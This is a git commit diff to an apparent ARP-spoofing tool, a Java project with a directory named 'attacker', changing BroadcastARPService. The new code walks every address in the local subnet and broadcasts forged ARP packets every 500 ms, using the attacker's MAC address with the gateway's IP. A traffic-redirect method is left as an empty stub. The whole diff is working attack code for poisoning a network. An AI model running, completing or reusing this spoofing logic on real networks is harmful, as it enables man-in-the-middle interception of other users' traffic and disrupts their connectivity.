6f80f88561c95a80873e7fd1a78db82be40a4828
ledor473 <ledor473@hotmail.com>
2012-01-26 10:24:03 -0500

    BroadcastArp adjustment

--- attacker/src/org/bitducks/spoofing/services/BroadcastARPService.java
+++ attacker/src/org/bitducks/spoofing/services/BroadcastARPService.java
@@ -3,47 +3,66 @@ package org.bitducks.spoofing.services;
 import java.io.IOException;
 import java.net.InetAddress;
 
-import jpcap.JpcapCaptor;
 import jpcap.JpcapSender;
 import jpcap.NetworkInterface;
 import jpcap.packet.ARPPacket;
 
+import org.bitducks.spoofing.core.Server;
 import org.bitducks.spoofing.core.Service;
 import org.bitducks.spoofing.packet.PacketFactory;
+import org.bitducks.spoofing.scan.IpRangeIterator;
+import org.bitducks.spoofing.util.IpUtil;
 import org.bitducks.spoofing.util.gateway.GatewayFinder;
 
 public class BroadcastARPService extends Service {
-
+	NetworkInterface servInterface;
+	IpRangeIterator iterator;
 	
+	public BroadcastARPService() {
+		servInterface = Server.getInstance().getNetworkInterface();
+		InetAddress firstIp = IpUtil.network(servInterface.addresses[0]);
+		InetAddress lastIp = IpUtil.lastIpInNetwork(servInterface.addresses[0]);
+		iterator = new IpRangeIterator(firstIp, lastIp);
+	}
 	
 	@Override
 	public void run() {
-		try {
-			//TODO: Need to get the server interface
-			NetworkInterface eth0 = JpcapCaptor.getDeviceList()[0];
-			InetAddress gateway;
-
-			gateway = GatewayFinder.find(eth0);
-
-			//TODO: Need to be an random valid IP address
-			InetAddress victim = InetAddress.getByName("192.168.2.110");
-
-			ARPPacket spoofedPacket = PacketFactory.arpRequest(eth0.mac_address, gateway, victim);
-
-			//open a network interface to send a packet to
-			JpcapSender sender = JpcapSender.openDevice(eth0);
-
-			while(! this.isCloseRequested()){
-				sender.sendPacket(spoofedPacket);
+		while(! this.isCloseRequested()){
+			spoofedPackage();
+			redirectTraffic();
+			
+			//Waiting 500ms to be sure we don't use all the CPU
+			try {
 				Thread.sleep(500);
+			} catch (InterruptedException e) {
+				e.printStackTrace();
 			}
-		} catch (IOException e) {
-			e.printStackTrace();
-		} catch (InterruptedException e1) {
-			e1.printStackTrace();
 		}
 	}
+	
+	private InetAddress getNextIp() {
+		if(! iterator.hasNext()) {
+			iterator.reset();
+		}
+		return iterator.next();
+	}
 
+	private void spoofedPackage() {
+		try {
+			
+			InetAddress gateway = GatewayFinder.find(servInterface);
 
+			ARPPacket spoofedPacket = PacketFactory.arpRequest(servInterface.mac_address, gateway, getNextIp());
 
+			Server.getInstance().sendPacket(spoofedPacket);
+			
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+	}
+	
+	private void redirectTraffic() {
+		// TODO Auto-generated method stub
+		
+	}
 }
